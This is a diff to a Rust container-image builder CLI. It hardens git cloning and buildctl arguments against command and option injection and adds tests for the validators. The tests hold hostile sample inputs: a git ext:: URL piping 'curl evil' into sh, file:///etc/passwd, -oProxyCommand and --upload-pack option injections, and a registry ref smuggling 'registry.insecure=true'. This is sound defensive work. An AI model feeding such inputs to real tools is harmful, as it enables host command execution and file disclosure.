@@ -2,7 +2,7 @@ use std::path::PathBuf;
 
 use clap::{Parser, Subcommand};
 
-/// Kiln — container image builder with automatic language detection
+/// Kiln builds container images with automatic language detection
 #[derive(Parser)]
 #[command(name = "kiln", version, about)]
 struct Cli {
@@ -180,6 +180,23 @@ fn cmd_build(
     registry_insecure: bool,
     overrides: kiln_core::BuildOverrides,
 ) -> std::result::Result<(), Box<dyn std::error::Error>> {
+    // Validate every untrusted argument before it reaches git or buildctl, so a
+    // crafted --source/--ref cannot execute commands on the host and a crafted
+    // registry ref cannot inject extra buildctl option attributes.
+    validate_registry_ref(dest)?;
+    if let Some(cache_ref) = cache_from {
+        validate_registry_ref(cache_ref)?;
+    }
+    if let Some(cache_ref) = cache_to {
+        validate_registry_ref(cache_ref)?;
+    }
+    if let Some(url) = source {
+        validate_git_source(url)?;
+    }
+    if let Some(git_ref) = git_ref {
+        validate_git_ref(git_ref)?;
+    }
+
     // Clone source repo if provided
     let work_dir = if let Some(url) = source {
         let tmp = std::env::temp_dir().join("kiln-build");
@@ -187,27 +204,27 @@ fn cmd_build(
             std::fs::remove_dir_all(&tmp)?;
         }
 
-        let mut cmd = std::process::Command::new("git");
+        let mut cmd = hardened_git();
         cmd.args(["clone", "--depth", "1"]);
         if let Some(r) = git_ref {
             cmd.args(["--branch", r]);
         }
+        // `--` terminates option parsing so a `-`-leading url/ref can never be
+        // read as a git flag (argument injection)
+        cmd.arg("--");
         cmd.args([url, &tmp.display().to_string()]);
 
         let status = cmd.status()?;
         if !status.success() {
             // If branch clone failed, try fetching specific ref (commit SHA)
             if let Some(r) = git_ref {
-                let status = std::process::Command::new("git")
-                    .args(["clone", url, &tmp.display().to_string()])
+                let status = hardened_git()
+                    .args(["clone", "--", url, &tmp.display().to_string()])
                     .status()?;
                 if !status.success() {
                     return Err("git clone failed".into());
                 }
-                let status = std::process::Command::new("git")
-                    .args(["checkout", r])
-                    .current_dir(&tmp)
-                    .status()?;
+                let status = hardened_git().args(["checkout", r]).current_dir(&tmp).status()?;
                 if !status.success() {
                     return Err("git checkout failed".into());
                 }
@@ -300,10 +317,100 @@ fn build_buildctl_args(
     args
 }
 
+/// A `git` command with its transport whitelist pinned, so even if a URL slips
+/// past [`validate_git_source`] the `ext::`/`file://` transports (host command
+/// execution, local disclosure) remain disabled.
+fn hardened_git() -> std::process::Command {
+    let mut cmd = std::process::Command::new("git");
+    cmd.env("GIT_ALLOW_PROTOCOL", "https:ssh")
+        .env("GIT_PROTOCOL_FROM_USER", "0");
+    cmd
+}
+
+/// Validate a user-supplied `--source` clone URL before handing it to `git`.
+///
+/// Only `https://`, `ssh://`, and scp-style `git@host:path` are accepted. This
+/// blocks git's `ext::` transport (arbitrary command execution on the host),
+/// `file://` (local repo disclosure), plain `http://`/`git://` (SSRF /
+/// downgrade), and any `-`-prefixed value that git would parse as an option.
+fn validate_git_source(url: &str) -> std::result::Result<(), String> {
+    let allowed = url.starts_with("https://") || url.starts_with("ssh://") || url.starts_with("git@");
+    if allowed {
+        Ok(())
+    } else {
+        Err("unsupported --source URL (use https://, ssh://, or git@host:path)".to_string())
+    }
+}
+
+/// Validate a user-supplied `--ref` before it reaches `git --branch`/`checkout`.
+///
+/// Restricts the ref to a safe charset with no leading `-`, so it cannot be
+/// parsed as a git option (argument injection) or carry shell metacharacters.
+fn validate_git_ref(git_ref: &str) -> std::result::Result<(), String> {
+    kiln_core::sanitize::validate_token("git ref", git_ref).map_err(|_| "invalid --ref value".to_string())
+}
+
+/// Validate a registry reference (`--dest`/`--cache-from`/`--cache-to`) before
+/// it is interpolated into a comma-separated `buildctl` option string. A comma
+/// or whitespace would let the value append extra attributes (e.g. force
+/// `registry.insecure=true` or a second push target).
+fn validate_registry_ref(reference: &str) -> std::result::Result<(), String> {
+    if reference.is_empty() || reference.contains(',') || reference.chars().any(|c| c.is_whitespace() || c.is_control())
+    {
+        Err("invalid registry reference".to_string())
+    } else {
+        Ok(())
+    }
+}
+
 #[cfg(test)]
 mod tests {
-    use super::build_buildctl_args;
+    use super::{build_buildctl_args, validate_git_ref, validate_git_source, validate_registry_ref};
     use std::path::Path;
+
+    #[test]
+    fn rejects_dangerous_git_sources() {
+        assert!(validate_git_source("ext::sh -c 'curl evil | sh'").is_err());
+        assert!(validate_git_source("file:///etc/passwd").is_err());
+        assert!(validate_git_source("-oProxyCommand=evil").is_err());
+        assert!(validate_git_source("http://evil.internal/x").is_err());
+        assert!(validate_git_source("git://evil/x").is_err());
+    }
+
+    #[test]
+    fn accepts_https_ssh_and_scp_git_sources() {
+        assert!(validate_git_source("https://github.com/o/r.git").is_ok());
+        assert!(validate_git_source("ssh://git@github.com/o/r.git").is_ok());
+        assert!(validate_git_source("git@github.com:o/r.git").is_ok());
+    }
+
+    #[test]
+    fn rejects_option_like_and_whitespace_git_refs() {
+        assert!(validate_git_ref("--upload-pack=evil").is_err());
+        assert!(validate_git_ref("a b").is_err());
+        assert!(validate_git_ref("").is_err());
+    }
+
+    #[test]
+    fn accepts_real_git_refs() {
+        assert!(validate_git_ref("main").is_ok());
+        assert!(validate_git_ref("v1.2.3").is_ok());
+        assert!(validate_git_ref("release/1.0").is_ok());
+        assert!(validate_git_ref("9c1f359").is_ok());
+    }
+
+    #[test]
+    fn rejects_registry_ref_with_comma_or_space() {
+        assert!(validate_registry_ref("app:tag,registry.insecure=true").is_err());
+        assert!(validate_registry_ref("app:tag foo").is_err());
+        assert!(validate_registry_ref("").is_err());
+    }
+
+    #[test]
+    fn accepts_normal_registry_refs() {
+        assert!(validate_registry_ref("ghcr.io/o/app:1.0").is_ok());
+        assert!(validate_registry_ref("localhost:5000/app@sha256:abcdef").is_ok());
+    }
 
     #[test]
     fn omits_cache_flags_when_unset() {
